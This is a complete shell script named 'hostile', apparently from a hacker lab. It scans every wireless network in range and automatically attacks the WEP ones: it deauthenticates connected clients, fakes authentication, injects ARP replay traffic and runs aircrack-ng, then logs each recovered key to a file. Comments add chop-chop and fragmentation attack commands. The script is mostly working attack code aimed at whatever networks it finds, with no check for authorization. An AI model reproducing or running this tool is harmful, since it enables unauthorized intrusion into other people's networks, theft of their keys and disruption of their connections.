#!/bin/sh

H_ME=${0##*/}
H_MY_D=${0%/*}
H_MY_D=$(cd $H_MY_D; pwd)
H_MY_PID=$$
H_VERSION="0.3.1"

h_usage() {
	cat << _END_OF_USAGE_

Usage: $H_ME OPTIONS

Scan its wireless environment and try to "play" with it

Options:
	-b,--bssid BSSID      restrict exploration to the specified BSSID
	-c,--channel CHANNEL  restrict exploration to the specified channel
	-m,--mac MAC          use specified hardware MAC address
	                      (use auto to get a random one)
	-l,--log-file FILE    log activity to the specified file
	-L,--lib-dir DIR      use the specified lib directory
	                      (for helper functions & scripts)
	-p,--pid-file FILE    log pid to the specified file
	-R,--run-dir DIR      use the specified run directory
	                      (for temporary files storage)

	-v,--verbose          be verbose (show what is being done)

	-V,--version          display program version and exit
	-h,--help             display program usage and exit

_END_OF_USAGE_
}

h_version() {
	cat << _END_OF_VERSION_
$H_ME v$H_VERSION, Copyright (C) /tmp/lap <contact@tmplab.org>

This program is free and excepted software; you can use it, redistribute it
and/or modify it under the terms of the Exception General Public License as
published by the Exception License Foundation; either version 2 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the Exception General Public License for more
details.

You should have received a copy of the Exception General Public License along
with this project; if not, write to the Exception License Foundation.

See http://www.egpl.info/projects/15
_END_OF_VERSION_
}

h_error() {
	echo "$H_ME: $@"
	exit 1
}

if [ -f /etc/hostile.conf ]; then
	H_CONFIG_F=/etc/hostile.conf
	H_LIB_D=/var/lib/hostile
	H_LOG_F=/var/log/hostile.log
	H_PID_F=/var/run/hostile.pid
	H_RUN_D=/var/run/hostile
elif [ -f /mnt/usbdrive/hostile.conf ]; then
	H_CONFIG_F=/mnt/usbdrive/hostile.conf
	H_LIB_D=/mnt/usbdrive/hostile.d
	H_LOG_F=/mnt/usbdrive/hostile.log
	H_PID_F=/mnt/usbdrive/hostile.pid
	H_RUN_D=/mnt/usbdrive/hostile-run.d
else
	if [ -f $H_MY_D/hostile.conf ]; then
		H_CONFIG_F=$H_MY_D/hostile.conf
	fi
	H_LIB_D=$H_MY_D/hostile.d
	H_LOG_F=$H_MY_D/hostile.log
	H_PID_F=$H_MY_D/hostile.pid
	H_RUN_D=$H_MY_D/hostile-run.d
fi

H_CAPTURE_IV_ONLY=1
H_CRACK_TIME_LIMIT=900
H_INJECTION_RATE_LIMIT=300
H_INJECTION_TIME_LIMIT=180
H_IV_MIN=30000
H_IV_MAX=150000
H_IV_RATE_SUCCESS=10
H_MONITOR_TIME_LIMIT=60
H_REFRESH_DELAY=20

H_AP_IP="192.168.69.254"
H_AP_NETWORK="192.168.69.0"
H_AP_NETMASK="255.255.255.0"
H_AP_DHCP_MIN="192.168.69.11"
H_AP_DHCP_MAX="192.168.69.19"
H_AP_DHCP_LEASE_TIME="1h"
H_AP_ESSID="LoveWRT"

H_WIFI_IF=wifi0
H_AP_IF=ath0
H_STA_IF=ath1
H_MON_IF=ath2

h_get_options() {
	while [ -n "$1" ]; do
		case $1 in
			-b|--bssid)
				shift
				H_OPT_BSSID=$1
				;;
			-c|--channel)
				shift
				H_OPT_CHANNEL=$1
				;;
			-C|--config-file)
				shift
				H_OPT_CONFIG_F=$1
				;;
			-m|--mac|--hwaddr)
				shift
				H_OPT_MAC=$1
				;;
			-l|--log-file)
				shift
				H_OPT_LOG_F=$1
				;;
			-L|--lib-dir)
				shift
				H_OPT_LIB_D=$1
				;;
			-p|--pid-file)
				shift
				H_OPT_PID_F=$1
				;;
			-R|--run-dir)
				shift
				H_OPT_RUN_D=$1
				;;
			-v|--verbose)
				H_OPT_VERBOSE=1
				;;
			-h|--help)
				h_usage
				exit 0
				;;
			-V|--version)
				h_version
				exit 0
				;;
			*)
				h_error "unknown option '$1'"
				exit 1
				;;
		esac
		shift
	done
}

h_now() {
	date +%s
}

h_log() {
	local time_now=$(h_now)
	local time_elapsed=$(($time_now - $H_TIME_START))
	local time_str=$(date +%T -d 0:0:$time_elapsed)
	echo "$H_ME [$time_str]: $@" >>$H_LOG_F
}

h_on_app_start() {
	h_log "starting"
	h_log "using config file: $H_CONFIG_F"
	h_log "using lib directory: $H_LIB_D"
	h_log "using run directory: $H_RUN_D"
	h_log "using tmp directory: $H_TMP_D"
}

h_on_app_end() {
	h_log "ended"
}

h_setup_linux()
{
h_log "h_setup_linux(): We are in Linux"
H_WIFI_IF=wlan0
H_AP_IF=ath0
H_STA_IF=ath1
H_MON_IF=mon0
}

h_setup_wrt()
{
h_log "h_setup_wrt(): We are in something ELSE, let's say OpenWRT for now"
}

h_startup() {
	H_TIME_START=$(h_now)
	if test `airodump-ng --help | grep Airodump-ng | cut -d ' ' -f 6 | cut -c 2-10` -lt 1513 ; 
	then 
		h_log "You are using a release of aircrack-ng prior to r1513... this is probably not going to work"
	fi
	[ "$OSTYPE" == "linux-gnu" ] && h_setup_linux || h_setup_wrt
	[ -n "$H_OPT_CONFIG_F" ] \
		&& H_CONFIG_F=$H_OPT_CONFIG_F
	[ -r $H_CONFIG_F ] \
		&& . $H_CONFIG_F \
		|| h_error "can't read config file '$H_CONFIG_F'"
	[ -n "$H_OPT_LIB_D" ] \
		&& H_LIB_D=$H_OPT_LIB_D
	[ -n "$H_OPT_LOG_F" ] \
		&& H_LOG_F=$H_OPT_LOG_F
	[ -n "$H_OPT_PID_F" ] \
		&& H_PID_F=$H_OPT_PID_F
	[ -n "$H_OPT_RUN_D" ] \
		&& H_RUN_D=$H_OPT_RUN_D
	touch $H_LOG_F >/dev/null 2>&1 \
		|| h_error "can't create log file '$H_LOG_F'"
	touch $H_PID_F >/dev/null 2>&1 \
		|| h_error "can't create pid file '$H_PID_F'"
	echo "$H_MY_PID" > $H_PID_F
	cd $H_LIB_D >/dev/null 2>&1 \
		|| h_error "can't use lib directory '$H_LIB_D'"
	[ -d $H_RUN_D ] \
		|| mkdir -p $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't create run directory '$H_RUN_D'"
	cd $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't use run directory '$H_RUN_D'"
	H_WEP_F=$H_RUN_D/hostile-wep.txt
	touch $H_WEP_F >/dev/null 2>&1 \
		|| h_error "can't create wep key file '$H_WEP_F'"
	H_TMP_D=$(mktemp -d $H_RUN_D/hostile-XXXXXX) \
		|| h_error "can't create tmp directory in '$H_RUN_D'"
	cd $H_TMP_D >/dev/null 2>&1 \
		|| h_error "can't use tmp directory '$H_TMP_D'"
	for M in $H_LIB_D/[0-9][0-9]-*.sh; do
		. $M
	done

	h_hook_register_handler on_app_starting h_on_app_start
	h_hook_register_handler on_app_ended h_on_app_end

	trap h_abort INT TERM

	h_hook_call_handlers on_app_starting
	h_hw_init
	h_hook_call_handlers on_app_started
}

h_cleanup() {
	h_hook_call_handlers on_app_ending
	h_auth_stop
	h_crack_stop
	h_replay_stop
	h_capture_stop
	sleep 1
	h_hw_fini
	h_hook_call_handlers on_app_ended
}

h_abort() {
	h_log "Caught ABORT, exiting gracefully"
	h_cleanup
	exit 1
}

h_hw_init_ath5k() {
iw dev $H_WIFI_IF interface add $H_AP_IF type ibss
#wlanconfig $H_AP_IF create wlandev $H_WIFI_IF wlanmode ap >/dev/null 2>&1 \
#|| h_log "can't create ap ($H_AP_IF) interface"
H_AP_MAC=$(h_mac_get $H_AP_IF)

iw dev $H_WIFI_IF interface add $H_STA_IF type managed
#wlanconfig $H_STA_IF create wlandev $H_WIFI_IF wlanmode sta nosbeacon >/dev/null 2>&1 \
#|| h_log "can't create sta ($H_STA_IF) interface"
H_STA_MAC=$(h_mac_get $H_STA_IF)

# ath5k example:
iw dev $H_WIFI_IF interface add $H_MON_IF type monitor
#wlanconfig $H_MON_IF create wlandev $H_WIFI_IF wlanmode monitor >/dev/null 2>&1 \
#|| h_log "can't create monitor ($H_MON_IF) interface"
H_MON_MAC=$(h_mac_get $H_MON_IF)
}

h_hw_init_linux() {
# TODO: Add detection of driver and associated commands (madwifi, ath5k, ...)
h_hw_init_ath5k
}

h_hw_init_wrt() {
	wlanconfig $H_AP_IF create wlandev $H_WIFI_IF wlanmode ap >/dev/null 2>&1 \
		|| h_log "can't create ap ($H_AP_IF) interface"
	H_AP_MAC=$(h_mac_get $H_AP_IF)
	
	wlanconfig $H_STA_IF create wlandev $H_WIFI_IF wlanmode sta nosbeacon >/dev/null 2>&1 \
		|| h_log "can't create sta ($H_STA_IF) interface"
	H_STA_MAC=$(h_mac_get $H_STA_IF)

	wlanconfig $H_MON_IF create wlandev $H_WIFI_IF wlanmode monitor >/dev/null 2>&1 \
		|| h_log "can't create monitor ($H_MON_IF) interface"
	H_MON_MAC=$(h_mac_get $H_MON_IF)
}

h_hw_init() {
	[ -n "$H_MAC" ] && {
		H_MAC_OLD=$(h_mac_get $H_WIFI_IF)
		h_mac_set $H_WIFI_IF $H_MAC
	}
	H_MAC=$(h_mac_get $H_WIFI_IF)
	h_log "using interface: $H_WIFI_IF, mac address: $H_MAC"

	[ "$OSTYPE" == "linux-gnu" ] && h_hw_init_linux || h_hw_init_wrt
}

h_hw_fini_linux() {
	ifconfig $H_MON_IF down
	sleep 1
	iw dev $H_MON_IF del
#	wlanconfig $H_MON_IF destroy >/dev/null 2>&1

	ifconfig $H_STA_IF down
	sleep 1
	iw dev $H_STA_IF del
#	wlanconfig $H_STA_IF destroy >/dev/null 2>&1

	ifconfig $H_AP_IF down
	sleep 1
	iw dev $H_AP_IF del
#	wlanconfig $H_AP_IF destroy >/dev/null 2>&1
}

h_hw_fini_wrt() {
	ifconfig $H_MON_IF down
	sleep 1
	wlanconfig $H_MON_IF destroy >/dev/null 2>&1

	ifconfig $H_STA_IF down
	sleep 1
	wlanconfig $H_STA_IF destroy >/dev/null 2>&1

	ifconfig $H_AP_IF down
	sleep 1
	wlanconfig $H_AP_IF destroy >/dev/null 2>&1
}

h_hw_fini() {
	[ "$OSTYPE" == "linux-gnu" ] && h_hw_fini_linux || h_hw_fini_wrt

	[ -n "$H_MAC_OLD" ] && {
		h_mac_set $H_WIFI_IF $H_MAC_OLD
	}
}

h_hw_prepare() {
	local plop
	local rate
	if [ "$H_CUR_CHANNEL" != "$H_OLD_CHANNEL" ]; then
		h_hook_call_handlers on_channel_changing
		plop=1
	fi
	if [ "$H_CUR_RATE" != "$H_OLD_RATE" ]; then
		h_hook_call_handlers on_rate_changing
		plop=1
	fi
	if [ -n "$plop" ]; then
		ifconfig $H_MON_IF down
		if [ "$H_CUR_CHANNEL" != "$H_OLD_CHANNEL" ]; then
			h_log "switching to channel: $H_CUR_CHANNEL"
			iwconfig $H_MON_IF channel $H_CUR_CHANNEL
			H_OLD_CHANNEL=$H_CUR_CHANNEL
			h_hook_call_handlers on_channel_changed
		fi
		if [ "$H_CUR_RATE" != "$H_OLD_RATE" ]; then
			[ $H_CUR_RATE -le 11 ] && rate="11M" || rate="54M"
			h_log "ajusting bit rate to: $rate"
			iwconfig $H_MON_IF rate $rate
			H_OLD_RATE=$H_CUR_RATE
			h_hook_call_handlers on_rate_changed
		fi
		return 0
	fi
	return 1
}

h_csv_get() {
	local F=$1
	local bssid=$2
	cat $F 2>/dev/null | tail -n +3 | grep "^$bssid,"
}

h_csv_get_network_iv_count() {
	local F=$1
	local bssid=$2
	local v=$(h_csv_get $F $bssid | awk -F\, '{ print $11; }')
	[ -z "$v" ] && v=0
	echo $v
}

h_csv_get_network_sta() {
	local F=$1
	local bssid=$2
	cat $F 2>/dev/null | grep "^.*,.*,.*,.*,.*, $bssid" | awk -F\, '{ print $1; }'
}


h_kis_get() {
	local F=$1
	cat $F 2>/dev/null | tail -n +2 | grep "^.*;infra"
}

h_kis_get_networks() {
	local F=$1
	h_kis_get $F | awk -F\; '{ print $22 "\;" $8 "\;" $1; }' | sort -n -r
}

h_kis_get_networks_by_enc() {
	local F=$1
	local E=$2
	h_kis_get_networks $F | grep "^.*;$E" | awk -F\; '{ print $3; }'
}

h_kis_get_network_bssid() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $4; }'
}

h_kis_get_network_channel() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $6; }'
}

h_kis_get_network_essid() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $3; }'
}

h_kis_get_network_max_rate() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $10; }' | awk -F. '{ print $1; }'
}

h_get_last_file() {
	echo $(ls -1 $* | tail -n 1)
}

h_get_sane_fname() {
	local F=$1
	echo $F | tr ':/' '__'
}


h_auth_start() {
	$@ >/dev/null 2>&1 &
	H_AUTH_PID="$! $H_AUTH_PID"
	return 0
}

h_auth_stop() {
	local pid
	for pid in $H_AUTH_PID; do
		kill -TERM $pid 2>/dev/null
	done
	unset H_AUTH_PID
	return 0
}


h_capture_start() {
	[ -z "$H_CAPTURE_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CAPTURE_PID=$!
	return 0
}

h_capture_stop() {
	[ -n "$H_CAPTURE_PID" ] || return 1
	kill -TERM $H_CAPTURE_PID 2>/dev/null
	unset H_CAPTURE_PID
	return 0
}


h_crack_start() {
	[ -z "$H_CRACK_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CRACK_PID=$!
	H_CRACK_TIME_STARTED=$(h_now)
	return 0
}

h_crack_stop() {
	[ -n "$H_CRACK_PID" ] || return 1
	kill -TERM $H_CRACK_PID 2>/dev/null
	unset H_CRACK_TIME_STARTED
	unset H_CRACK_PID
	return 0
}


h_replay_start() {
	[ -z "$H_REPLAY_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_REPLAY_PID=$!
	return 0
}

h_replay_stop() {
	[ -n "$H_REPLAY_PID" ] || return 1
	kill -TERM $H_REPLAY_PID 2>/dev/null
	unset H_REPLAY_PID
	return 0
}


h_capture() {
	local cmd="airodump-ng $H_MON_IF $*"
	h_log "running: $cmd"
	exec $cmd
}

h_monitor_all() {
	h_log "monitoring traffic for $H_MONITOR_TIME_LIMIT seconds"

	ifconfig $H_MON_IF down
	iwconfig $H_MON_IF channel 0

	ifconfig $H_AP_IF >>/tmp/h.log
	ifconfig $H_MON_IF >>/tmp/h.log
	iwconfig $H_AP_IF >>/tmp/h.log
	iwconfig $H_MON_IF >>/tmp/h.log

	h_capture_start h_capture --write ALL ${H_OPT_BSSID:+--bssid $H_OPT_BSSID} ${H_OPT_CHANNEL:+--channel $H_OPT_CHANNEL} -f 250 --output-format=csv,kismet
	sleep $H_MONITOR_TIME_LIMIT
	h_capture_stop
	
	sleep 1

	H_ALL_CSV_F=$(h_get_last_file ALL-??.csv)
	H_ALL_KIS_F=$(h_get_last_file ALL-??.kismet.csv)

	H_NET_OPEN_F=ALL-OPEN.txt
	H_NET_WEP_F=ALL-WEP.txt
	H_NET_WPA_F=ALL-WPA.txt
	h_kis_get_networks_by_enc $H_ALL_KIS_F "O" >$H_NET_OPEN_F
	h_kis_get_networks_by_enc $H_ALL_KIS_F "WEP" >$H_NET_WEP_F
	h_kis_get_networks_by_enc $H_ALL_KIS_F "WPA" >$H_NET_WPA_F

	local n_open=$(wc -l <$H_NET_OPEN_F)
	local n_wep=$(wc -l <$H_NET_WEP_F)
	local n_wpa=$(wc -l <$H_NET_WPA_F)
	h_log "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
}


#
# handle open networks
#

h_open_try_one_network() {
	local N=$1
	local bssid=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
	local channel=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
	local essid=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
	h_log "found open network: bssid=$bssid, channel=$channel, essid='$essid'"
}

h_open_try_all_networks() {
	for N in $(cat $H_NET_OPEN_F); do
		h_open_try_one_network $N
	done
}


#
# handle WEP networks
#

h_wep_log_key() {
	local key=$(cat $H_CUR_KEY_F)
	h_log "key found: $key"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
	H_WEP_CHANNEL=$H_CUR_CHANNEL
}

h_wep_attack_is_working() {
	local iv
	local iv_last
	local time
	local time_last
	local time_start
	local time_elapsed
	local div
	local dtime
	local iv_rate

	time_start=$(h_now)
	iv_last=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
	time_last=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
		div=$(($iv - $iv_last))
		dtime=$(($time - $time_last))
		iv_rate=$(($div / $dtime))
		h_log "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
		iv_last=$iv
		time_last=$time
	done
	return 1
}

h_wep_attack_try() {
	local replay_func=$1
	local auth_func
	local clients
	local iv
	local crack_time_started
	local RC=1
	
	h_replay_start $replay_func
	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
	else
		h_log "no client station found"
		h_auth_start h_wep_auth_fake1
	fi

	if h_wep_attack_is_working; then
		h_log "attack seems to be working \o/ :)"
		h_hook_call_handlers on_wep_attack_working
		while [ 1 ]; do
			iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
			if [ $iv -ge $H_IV_MIN ]; then
				if [ $iv -ge $H_IV_MAX ]; then
					h_log "max IVs limit ($H_IV_MAX) reached"
					break
				fi
				if [ -z "$crack_time_started" ]; then
					h_log "min IVs limit ($H_IV_MIN) reached"
					h_crack_start h_wep_crack
					crack_time_started=$(h_now)
				else
					local crack_time=$(h_now)
					local crack_time_elapsed=$(($crack_time - $crack_time_started))
					if [ $crack_time_elapsed -ge $H_CRACK_TIME_LIMIT ]; then
						h_log "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
						break
					fi
				fi
			fi
			if [ -f $H_CUR_KEY_F ]; then
				h_hook_call_handlers on_wep_key_found
				h_wep_log_key
				RC=0
				break
			fi
			if ! h_wep_attack_is_working; then
				h_log "attack stalled, aborting"
				break
			fi
		done
	fi

	h_crack_stop
	h_auth_stop
	h_replay_stop

	return $RC
}

h_wep_crack() {
	local cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
	h_log "running: $cmd"
	exec $cmd
}

h_wep_auth() {
	local cmd="aireplay-ng $H_MON_IF $*"
	h_log "running: $cmd"
	exec $cmd
}

h_wep_auth_fake1() {
	h_wep_auth -1 6000 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 1 -q 10
}

h_wep_auth_fake2() {
	h_wep_auth -1 0 -b $H_CUR_BSSID -e $H_CUR_ESSID
}

h_wep_auth_fake3() {
	h_wep_auth -1 5 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 10 -q 1
}

h_wep_deauth() {
	h_wep_auth -0 1 -a $H_CUR_BSSID $*
}

# Chop-Chop
#aireplay-ng ath1 --chopchop -F -b AP -h STA
#packetforge-ng -0 -a AP -h STA -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

# Fragmentation Attack
#aireplay-ng ath1 -5 -b AP -h STA -k TARGET -l SOURCE
#packetforge-ng -0 -a AP -h STA -k TARGET -l SOURCE -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

h_wep_replay() {
	local cmd="aireplay-ng $H_MON_IF $*"
	if [ $H_INJECTION_RATE_LIMIT -gt 0 ]; then
		cmd="$cmd -x $H_INJECTION_RATE_LIMIT"
	fi
	h_log "running: $cmd"
	exec $cmd
}

h_wep_replay_arp1() {
	h_wep_replay -3 -b $H_CUR_BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_arp2() {
	h_wep_replay -2 -b $H_CUR_BSSID -c FF:FF:FF:FF:FF:FF -p 0841 -F ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_caffe_latte() {
	h_wep_replay -6 -b $H_CUR_BSSID -D
}

h_wep_replay_hilte() {
	h_wep_replay -7 -b $H_CUR_BSSID -D
}

h_wep_try_arp_replay_1() {
	h_log "trying ARP replay attack (1)"
	h_wep_attack_try "h_wep_replay_arp1"
	return $?
}

h_wep_try_arp_replay_2() {
	h_log "trying ARP replay attack (2)"
	h_wep_attack_try "h_wep_replay_arp2"
	return $?
}

h_wep_try_caffe_latte() {
	h_log "trying Caffe-Latte"
	h_wep_attack_try "h_wep_replay_caffe_latte"
	return $?
}

h_wep_try_hilte() {
	h_log "trying Hilte"
	h_wep_attack_try "h_wep_replay_hilte"
	return $?
}

H_WEP_ATTACKS=" \
	h_wep_try_arp_replay_1 \
	h_wep_try_arp_replay_2 \
"

h_wep_try_one_network() {
	local N=$1
	local capture_options

	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
	H_CUR_RATE=$(h_kis_get_network_max_rate $H_ALLKIS_F $N)
	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)

	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
		return 0
	fi

	h_log "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
	h_hook_call_handlers on_wep_attack_started
	
	h_hw_prepare
	
	ifconfig $H_MON_IF up

	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CUR_CAP_FEXT="ivs"
		capture_options="--output-format=ivs,csv"
	else
		H_CUR_CAP_FEXT="cap"
		capture_options="--output-format=pcap,csv"
	fi
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"

	for attack in $H_WEP_ATTACKS; do
		$attack && break
	done
	
	h_capture_stop

	h_hook_call_handlers on_wep_attack_ended
}

h_wep_try_all_networks() {
	for N in $(cat $H_NET_WEP_F); do
		h_wep_try_one_network $N
	done
}


h_get_options $@
h_startup
while [ 1 ]; do
	h_monitor_all
	h_open_try_all_networks
	h_wep_try_all_networks
	sleep 60
done
h_cleanup
